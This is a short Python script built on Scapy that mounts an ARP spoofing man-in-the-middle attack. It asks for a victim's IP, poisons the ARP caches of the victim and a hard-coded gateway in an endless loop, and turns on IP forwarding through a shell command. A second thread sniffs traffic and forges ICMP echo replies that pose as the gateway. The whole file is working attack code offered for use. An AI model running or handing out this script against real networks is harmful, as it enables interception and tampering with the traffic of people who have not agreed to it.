#!/usr/bin/env python3

from scapy.all import *
import os
import time
import threading

# IP address of the victim
victim_ip = input("victim ip: ")

# IP address of the default gateway
gateway_ip = "10.100.102.1"

# MAC address of the victim
victim_mac = getmacbyip(victim_ip)
print(victim_mac)
# MAC address of the default gateway
gateway_mac = getmacbyip(gateway_ip)

# MAC address of the attacker
attacker_mac = get_if_hwaddr(conf.iface)

# Enable IP forwarding on the attacker's machine
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Continuously send ARP spoofing packets to the victim and the default gateway
def arp_spoof():
    while True:
        # Send an ARP request to the victim pretending to be the default gateway
        arp_request = Ether(dst=victim_mac) / ARP(op=1, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=attacker_mac)
        sendp(arp_request)
        # Send an ARP request to the default gateway pretending to be the victim
        arp_request = Ether(dst=gateway_mac) / ARP(op=1, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=attacker_mac)
        sendp(arp_request)
        # Wait for 1 second before sending the next packets
        time.sleep(1)


def packet_sniffer():
	while True:
		packets = sniff(iface=conf.iface, count=1)
		packet = packets[0]
		# If the packet is an ICMP ping request from the victim
		if packet.haslayer(ICMP) and packet[ICMP].type == 8 and packet[IP].src == victim_ip:
			# Send an ICMP ping reply to the victim pretending to be the default gateway
			icmp_reply = Ether(dst=victim_mac) / IP(dst=victim_ip, src=gateway_ip) / ICMP(type=0) / packet[ICMP].payload
			sendp(icmp_reply)


thread1 = threading.Thread(target=arp_spoof)
thread2 = threading.Thread(target=packet_sniffer)
        
thread1.start()
thread2.start()
        
while True:
	pass
